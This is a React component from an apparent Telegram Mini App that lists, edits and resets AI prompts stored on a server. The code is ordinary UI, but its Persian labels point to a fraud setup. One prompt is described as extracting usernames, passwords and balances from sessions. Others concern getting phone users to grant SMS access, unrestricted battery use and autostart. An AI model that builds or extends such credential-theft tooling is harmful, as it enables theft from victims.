"use client";

import { backButton } from "@tma.js/sdk-react";
import { useCallback, useEffect, useState } from "react";

import { PullToRefresh } from "@/components/PullToRefresh";
import { readInitDataRaw } from "@/lib/telegram/initDataClient";

type PromptItem = { id: string; text: string; custom?: boolean };

const promptMeta: Record<string, { title: string; meta: string }> = {
  extract: { title: "استخراج نشست", meta: "تحلیل نام کاربری، رمز و موجودی" },
  sms_v1: { title: "اخذ دسترسی", meta: "انتخاب دکمهٔ مجاز" },
  battery: { title: "باتری", meta: "بدون محدودیت" },
  alarm: { title: "هشدار دقیق", meta: "اجازهٔ آلارم" },
  oem: { title: "اجرای خودکار", meta: "پیدا کردن برنامه در فهرست سازنده" },
  general: { title: "عمومی", meta: "وقتی مرحلهٔ مشخصی نیست" },
};

export function PromptScreen({ active, onBack }: { active: boolean; onBack: () => void }) {
  const [items, setItems] = useState<PromptItem[]>([]);
  const [openId, setOpenId] = useState("");
  const [error, setError] = useState("");

  const headers = useCallback((): HeadersInit => {
    const initData = readInitDataRaw();
    return initData ? { "x-telegram-init-data": initData } : {};
  }, []);

  const load = useCallback(async () => {
    try {
      const res = await fetch("/api/ai/prompts", { headers: headers(), cache: "no-store" });
      if (!res.ok) {
        setError("خواندن پرامپت‌ها ممکن نشد.");
        return;
      }
      const body = (await res.json()) as { items?: PromptItem[] };
      setItems(body.items || []);
      setError("");
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    }
  }, [headers]);

  const closePrompt = useCallback(() => setOpenId(""), []);

  useEffect(() => {
    if (active) void load();
  }, [active, load]);

  useEffect(() => {
    if (!active || openId) {
      if (!active) backButton.hide.ifAvailable();
      return;
    }
    backButton.mount.ifAvailable();
    backButton.show.ifAvailable();
    let off: (() => void) | undefined;
    try {
      off = backButton.onClick(onBack);
    } catch {
      // outside Telegram
    }
    return () => {
      off?.();
      backButton.hide.ifAvailable();
    };
  }, [active, onBack, openId]);

  const open = items.find((item) => item.id === openId);

  return (
    <div className="md-stack__page md-stack__page--on">
      <div className="md-stack">
        <div className={`md-stack__page${openId ? "" : " md-stack__page--on"}`}>
          <PullToRefresh onRefresh={load}>
            <div className="md-content">
              {error ? <p className="md-banner">{error}</p> : null}
              <section className="md-sheet">
                {items.map((item) => {
                  const meta = promptMeta[item.id];
                  return (
                    <button key={item.id} type="button" className="md-settings-row" onClick={() => setOpenId(item.id)}>
                      <span className="md-settings-row__body">
                        <span className="md-settings-row__title">{meta?.title || item.id}</span>
                        <span className="md-settings-row__meta">{meta?.meta || item.id}</span>
                      </span>
                      {item.custom ? <span className="md-settings-row__meta">تغییر یافته</span> : null}
                    </button>
                  );
                })}
              </section>
            </div>
          </PullToRefresh>
        </div>
        {open ? (
          <PromptEditor
            item={open}
            active={active}
            headers={headers}
            onBack={closePrompt}
            onSaved={(next) => {
              setItems((current) => current.map((row) => (row.id === next.id ? next : row)));
            }}
          />
        ) : null}
      </div>
    </div>
  );
}

function PromptEditor({
  item,
  active,
  headers,
  onBack,
  onSaved,
}: {
  item: PromptItem;
  active: boolean;
  headers: () => HeadersInit;
  onBack: () => void;
  onSaved: (item: PromptItem) => void;
}) {
  const [text, setText] = useState(item.text);
  const [error, setError] = useState("");
  const [hint, setHint] = useState("");
  const [busy, setBusy] = useState(false);
  const meta = promptMeta[item.id];

  useEffect(() => {
    setText(item.text);
  }, [item]);

  useEffect(() => {
    if (!active) {
      backButton.hide.ifAvailable();
      return;
    }
    backButton.mount.ifAvailable();
    backButton.show.ifAvailable();
    let off: (() => void) | undefined;
    try {
      off = backButton.onClick(onBack);
    } catch {
      // outside Telegram
    }
    return () => {
      off?.();
      backButton.hide.ifAvailable();
    };
  }, [active, onBack]);

  async function save() {
    setBusy(true);
    setHint("");
    setError("");
    try {
      const res = await fetch(`/api/ai/prompts/${encodeURIComponent(item.id)}`, {
        method: "PUT",
        headers: { ...headers(), "Content-Type": "application/json" },
        body: JSON.stringify({ text }),
      });
      if (!res.ok) {
        setError("ذخیره نشد.");
        return;
      }
      const body = (await res.json()) as PromptItem;
      onSaved({ id: item.id, text: body.text || text, custom: true });
      setHint("ذخیره شد");
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    } finally {
      setBusy(false);
    }
  }

  async function reset() {
    setBusy(true);
    setHint("");
    setError("");
    try {
      const res = await fetch(`/api/ai/prompts/${encodeURIComponent(item.id)}`, {
        method: "DELETE",
        headers: headers(),
      });
      if (!res.ok) {
        setError("بازگشت انجام نشد.");
        return;
      }
      const body = (await res.json()) as PromptItem;
      const next = body.text || "";
      setText(next);
      onSaved({ id: item.id, text: next, custom: false });
      setHint("متن پیش‌فرض برگشت");
    } catch {
      setError("ارتباط با سرور برقرار نشد.");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="md-stack__page md-stack__page--on">
      <PullToRefresh onRefresh={async () => undefined}>
        <div className="md-content">
          {error ? <p className="md-banner">{error}</p> : null}
          {hint ? <p className="md-code-banner">{hint}</p> : null}
          <section className="md-block">
            <p className="md-group__meta">{meta?.title || item.id}</p>
            <label className="md-field">
              <span>پرامپت</span>
              <textarea value={text} onChange={(event) => setText(event.target.value)} rows={16} dir="ltr" />
            </label>
            <div className="md-device-actions">
              <button type="button" className="md-action" disabled={busy || !text.trim()} onClick={() => void save()}>
                {busy ? "…" : "ذخیره"}
              </button>
              <button type="button" className="md-action md-action--tonal" disabled={busy || !item.custom} onClick={() => void reset()}>
                پیش‌فرض
              </button>
            </div>
          </section>
        </div>
      </PullToRefresh>
    </div>
  );
}
